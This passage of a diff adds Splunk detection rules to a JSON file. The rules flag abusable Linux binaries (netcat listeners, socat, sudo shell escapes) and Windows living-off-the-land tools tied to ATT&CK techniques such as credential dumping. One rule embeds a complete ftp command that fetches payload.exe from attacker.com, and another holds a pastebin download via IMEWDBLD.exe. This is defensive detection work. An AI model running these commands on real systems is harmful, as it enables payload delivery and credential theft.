+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (minicom -D /dev/null)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) mosquitto",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (mosquitto -c)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) mount",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (sudo mount -o bind /bin/sh /bin/mountsudo mount)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) msfconsole",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (msfconsole)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) msgattrib",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (*msgattrib -P *)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) msgcat",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (msgcat -P)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) msgconv",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (msgconv -P)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) msgfilter",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (msgfilter)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) msgmerge",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (*msgmerge -P)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) msguniq",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (msguniq -P)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) mtr",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (mtr --raw -F)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) multitime",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (multitime /bin/*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) mysql",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (mysql (\"-e\" OR \"--default-auth\"))",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) nano",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (nano -s *bin/*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) nasm",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (nasm -@)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) nawk",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (nawk)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) nc",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (nc -l -p)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) ncdu",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (ncdub)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) ncftp",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (ncftp)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) neofetch",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (neofetch AND (\"*/bin/*\" OR \"--ascii\"))",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) nft",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (nft -f)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) nice",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (nice)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) nl",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (nl -bn -w1 -s)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) nm",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (nm @)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) nmap",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (comm=\"nmap *\" OR comm=\"*/nmap *\")",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) node",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (comm=\"node *\")",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) nohup",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (nohup)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) npm",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (npm exec /bin/*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) nroff",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (nroff)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) ntpdate",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (ntpdate -a x -k -d)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) octave",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (octave-cli --eval)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) od",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (od -An -c -w9999)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) openssl",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (openssl)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) openvt",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (sudo openvt -- sh -c)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) opkg",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (sudo opkg install deb)",
+        "sevirity": 4
+    },
+    {
+        "name": "Orphaned scheduled searches",
+        "query": "| rest timeout=600 splunk_server=local /servicesNS/-/-/saved/searches add_orphan_field=yes count=0 \n| search orphan=1 disabled=0 is_scheduled=1 \n| eval status = if(disabled = 0, \"enabled\", \"disabled\") \n| fields title eai:acl.owner eai:acl.app eai:acl.sharing orphan status is_scheduled cron_schedule next_scheduled_time next_scheduled_time actions \n| rename title AS \"search name\" eai:acl.owner AS owner eai:acl.app AS app eai:acl.sharing AS sharing",
+        "sevirity": 3
+    },
+    {
+        "name": "(Linux) pandoc",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (pandoc (\"-t\" OR \"/bin/*\")",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) paste",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (paste)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) pax",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (pax -w)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) pdflatex",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (pdflatex)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) pdftex",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (pdftex --shell-escape)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) perf",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (perf stat /bin/*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) perl",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (perl exec /bin/*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) perlbug",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (perlbug -s)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) pexec",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (pexec)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) pg",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (comm=*pg*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) php",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND ((comm=\"*.php\") OR (comm=\"php\") OR (comm=\"*/php\"))",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) pico",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (pico*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) pidstat",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (pidstat -e)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) pkexec",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (sudo pkexec)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) pkg",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (sudo pkg install -y --no-repo-update)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) posh",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (posh)",
+        "sevirity": 4
+    },
+    {
+        "name": "Possible privelage escallation",
+        "query": "runas",
+        "sevirity": 4
+    },
+    {
+        "name": "powershell history",
+        "query": "ConsoleHost_history.txt",
+        "sevirity": 3
+    },
+    {
+        "name": "(Linux) pr",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (pr -T)",
+        "sevirity": 4
+    },
+    {
+        "name": "PrivEsc by pspy",
+        "query": "comm=\"pspy\"",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) pry",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (prysystem(*))",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) psftp",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (psftp)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) psql",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (psql*/bin/sh)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) ptx",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (ptx -w 5000)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) puppet",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (comm=puppet)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) pwsh",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (pwsh)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) python",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (comm=\"python *\" OR comm=\"python3 *\" OR \"import *os*\" OR comm=\"pip3 *\" OR \"pip *\" OR \"import sys\")",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) rake",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (rake -p)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) rc",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (rc -c /bin/*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) readelf",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (readelf -a @)",
+        "sevirity": 4
+    },
+    {
+        "name": "Recorded Future - Back-fill Correlation Search",
+        "query": "| localop | rest splunk_server=local /services/TA-recordedfuture/correlation_search earliest=$dispatch.earliest_time$ latest=$dispatch.latest_time$ dm_only=true",
+        "sevirity": 3
+    },
+    {
+        "name": "Recorded Future - Check Asynchronous Jobs",
+        "query": "| localop | rest splunk_server=local /services/TA-recordedfuture/check_async_jobs",
+        "sevirity": 3
+    },
+    {
+        "name": "Recorded Future - Correlation Search",
+        "query": "| localop | rest splunk_server=local /services/TA-recordedfuture/correlation_search earliest=$dispatch.earliest_time$ latest=$dispatch.latest_time$",
+        "sevirity": 3
+    },
+    {
+        "name": "Recorded Future - Download Risk Lists",
+        "query": "| localop | rest splunk_server=local /services/TA-recordedfuture/sync_correlation_feeds timeout=3599",
+        "sevirity": 3
+    },
+    {
+        "name": "Recorded Future - Purge Old Correlation Data",
+        "query": "| localop | rest splunk_server=local /services/TA-recordedfuture/purge_correlation_caches",
+        "sevirity": 3
+    },
+    {
+        "name": "Recorded Future - Purge Old Sigma Rules Detections",
+        "query": "| localop | rest splunk_server=local /services/TA-recordedfuture/purge_sigma_detection_cache",
+        "sevirity": 3
+    },
+    {
+        "name": "Recorded Future - Purge Old Threat Hunt Results",
+        "query": "| localop | rest splunk_server=local /services/TA-recordedfuture/purge_threat_hunt_result_cache",
+        "sevirity": 3
+    },
+    {
+        "name": "Recorded Future - Send Daily Metrics",
+        "query": "| localop | rest splunk_server=local /services/TA-recordedfuture/send_metrics",
+        "sevirity": 3
+    },
+    {
+        "name": "Recorded Future - Send Weekly Active Users statistics",
+        "query": "| localop | rest splunk_server=local /services/TA-recordedfuture/push_wau_stats",
+        "sevirity": 3
+    },
+    {
+        "name": "Recorded Future - Sigma Search",
+        "query": "| localop | rest splunk_server=local /services/TA-recordedfuture/sigma_search earliest=$dispatch.earliest_time$ latest=$dispatch.latest_time$",
+        "sevirity": 3
+    },
+    {
+        "name": "Recorded Future - Store config",
+        "query": "| localop | rest splunk_server=local /services/TA-recordedfuture/store_config",
+        "sevirity": 3
+    },
+    {
+        "name": "Recorded Future - Sync UI Elements",
+        "query": "| localop | rest splunk_server=local /services/TA-recordedfuture/sync_ui_elements",
+        "sevirity": 3
+    },
+    {
+        "name": "Recorded Future - Sync Use Cases",
+        "query": "| localop | rest splunk_server=local /services/TA-recordedfuture/sync_usecases timeout=240",
+        "sevirity": 3
+    },
+    {
+        "name": "Recorded Future - Timing logs extractor",
+        "query": "| localop | rest splunk_server=local /services/TA-recordedfuture/send_timing_logs_to_bfi",
+        "sevirity": 3
+    },
+    {
+        "name": "Recorded Future - Update Playbook Alerts",
+        "query": "| localop | rest splunk_server=local /services/TA-recordedfuture/update_cached_playbook_alerts",
+        "sevirity": 3
+    },
+    {
+        "name": "Recorded Future - Update Sigma State",
+        "query": "| localop | rest splunk_server=local /services/TA-recordedfuture/save_sigma_rule state=update",
+        "sevirity": 3
+    },
+    {
+        "name": "(Linux) red",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (red)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) redcarpet",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (redcarpet)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) redis",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (redis-cli -h set dir save)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) restic",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (restic backup -r rest)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) rev",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (rev)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) rlogin",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (rlogin -l -p)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) rlwrap",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (rlwrap)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) rpm",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (rpm --eval)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) rpmdb",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (rpmdb --eval)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) rpmquery",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (rpmquery --eval)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) rpmverify",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (rpmverify --eval)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) rsync",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (rsync -e)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) rtorrent",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (rtorrent)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) ruby",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (ruby -e)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) run-parts",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (run-parts --new-session --regex '^sh* /bin)",
+        "sevirity": 4
+    },
+    {
+        "name": "run-parts-1",
+        "query": "run-parts --new-session --regex '^sh* /bin",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) runscript",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (/bin/* runscript)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) rvim",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (rvim)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) sash",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (sash)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) scanmem",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (scanmem)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) scp",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (comm=scp)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) screen",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (comm=screen)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) script",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (script -q)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) scrot",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (scrot -e)",
+        "sevirity": 4
+    },
+    {
+        "name": "Searching for active hosts by ping and grep",
+        "query": "comm=*ping* AND comm=*grep*",
+        "sevirity": 2
+    },
+    {
+        "name": "(Linux) sed",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (sed -n)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) service",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (*service*/bin/sh)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) setarch",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (setarch)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) setfacl",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (setfacl -m -u)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) setlock",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (setlock)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) sftp",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (sftp AND (\"/bin/*\" OR \"get\" OR \"put\"))",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) sg",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (comm=\"* sg *\")",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) shuf",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (shuf -z)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) slsh",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (slsh -e 'system(\"*\")')",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) smbclient",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (smbclient)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) snap",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (sudo snap install --dangerous --devmode)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) socat",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (socat)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) socket",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (socket vp -i)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) soelim",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (soelim)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) softlimit",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (softlimit /bin/*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) sort",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (sort -m)",
+        "sevirity": 4
+    },
+    {
+        "name": "Splunk errors last 24 hours",
+        "query": "index=_internal \" error \" NOT debug source=*splunkd.log*",
+        "sevirity": 3
+    },
+    {
+        "name": "(Linux) sqlite3",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (comm=\"sqlite3\" OR comm=\"*/sqlite3\" OR comm=\"sqlite3 *\" OR comm=\"*/sqlite3 *\" OR comm=\"* */sqlite3 *\" OR comm=\"* sqlite3 *\")",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) sqlmap",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (sqlmap)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) ss",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (ss -a -F)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) ssh",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (comm=\"*ssh*\")",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) ssh-agent",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (ssh-agent)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) ssh-keygen",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (ssh-keygen -D)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) ssh-keyscan",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (ssh-keyscan -f)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) sshpass",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (sshpass /bin/*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) start-stop-daemon",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (start-stop-daemon -n -S -x /bin/*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) stdbuf",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (stdbuf -i0)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) strace",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (strace /bin/*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) sudo",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (sudo sudo /bin/sh)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) sysctl",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND ((\"*kill -QUIT cat\") OR (\"/usr/sbin/sysctl -n\"))",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) systemctl",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (*echo systemctl enable --now)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Linux) systemd-resolve",
+        "query": "(index=\"linux_corp\" OR index=\"linux_dmz\") AND (sudo systemd-resolve --status!sh)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1003.001: adplus.exe",
+        "query": "(index=\"windows\") AND (adplus.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1003.001: Comsvcs.dll",
+        "query": "(index=\"windows\") AND (rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump full)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1003.001: Dump64.exe",
+        "query": "(index=\"windows\") AND (dump64.exe out.dmp)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1003.001: DumpMinitool.exe",
+        "query": "(index=\"windows\") AND (DumpMinitool.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1003.002: Reg.exe",
+        "query": "(index=\"windows\") AND (reg save)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1003.003: Diskshadow.exe",
+        "query": "(index=\"windows\") AND (diskshadow.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1003.003: dsdbutil.exe",
+        "query": "(index=\"windows\") AND (dsdbutil.exe \"activate instance ntds\" \"snapshot\")",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1003.003: ntdsutil.exe",
+        "query": "(index=\"windows\") AND (ntdsutil.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1003.003: wbadmin.exe",
+        "query": "(index=\"windows\") AND (wbadmin)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1003: Createdump.exe",
+        "query": "(index=\"windows\") AND (createdump.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1003: rdrleakdiag.exe",
+        "query": "(index=\"windows\") AND (rdrleakdiag)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1003: Rpcping.exe",
+        "query": "(index=\"windows\") AND (rpcping -s -e -a -u)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1003: Sqldumper.exe",
+        "query": "(index=\"windows\") AND (sqldumper)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1003: Tttracer.exe",
+        "query": "(index=\"windows\") AND (TTTracer.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1036.005: Colorcpl.exe",
+        "query": "(index=\"windows\") AND (colorcpl)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1040: Pktmon.exe",
+        "query": "(index=\"windows\") AND (pktmon.exe start)",
+        "sevirity": 4
+    },
+    {
+        "name": "T1040: Pktmon.exe-1",
+        "query": "pktmon.exe filter",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1048: TestWindowRemoteAgent.exe",
+        "query": "(index=\"windows\") AND (TestWindowRemoteAgent.exe start -h -p)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1053.002: At.exe",
+        "query": "(index=\"windows\") AND (at.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1053.005: Schtasks.exe",
+        "query": "(index=\"windows\") AND (schtasks)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1055: coregen.exe",
+        "query": "(index=\"windows\") AND (coregen.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1059.001: Powershell.exe",
+        "query": "(index=\"windows\") AND (powershell.exe -ep)",
+        "sevirity": 4
+    },
+    {
+        "name": "T1059.001: Powershell.exe-1",
+        "query": "powershell.exe -exec",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1059.003: Cmd.exe",
+        "query": "(index=\"windows\") AND (cmd.exe - \"<\")",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1059: Fsi.exe",
+        "query": "(index=\"windows\") AND (fsi.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1059: FsiAnyCpu.exe",
+        "query": "(index=\"windows\") AND (fsianycpu.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1078: Cmdkey.exe",
+        "query": "(index=\"windows\") AND (cmdkey)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: AppInstaller.exe",
+        "query": "(index=\"windows\") AND (ms-appinstaller:*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: CertReq.exe",
+        "query": "(index=\"windows\") AND (CertReq -Post -config)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: Certutil.exe",
+        "query": "(index=\"windows\") AND (certutil.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: cmdl32.exe",
+        "query": "(index=\"windows\") AND (cmdl32)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: Desktopimgdownldr.exe",
+        "query": "(index=\"windows\") AND (desktopimgdownldr.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: devtunnel.exe",
+        "query": "(index=\"windows\") AND (devtunnel.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: Esentutl.exe",
+        "query": "(index=\"windows\") AND (esentutl.exe OR esentutl)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: Excel.exe",
+        "query": "(index=\"windows\") AND (Excel.exe http*)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: Expand.exe",
+        "query": "(index=\"windows\") AND (expand OR expand.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: Finger.exe",
+        "query": "(index=\"windows\") AND (finger)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: Ftp.exe",
+        "query": "(index=\"windows\") AND (cmd.exe /c \"@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v\")",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: GfxDownloadWrapper.exe",
+        "query": "(index=\"windows\") AND (GfxDownloadWrapper)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: Hh.exe",
+        "query": "(index=\"windows\") AND (HH.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: Ieexec.exe",
+        "query": "(index=\"windows\") AND (ieexec.exe)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: IMEWDBLD.exe",
+        "query": "(index=\"windows\") AND (C:\\Windows\\System32\\IME\\SHARED\\IMEWDBLD.exe https://pastebin.com/raw/tdyShwLw)",
+        "sevirity": 4
+    },
+    {
+        "name": "(Windows) T1105: Installutil.exe",
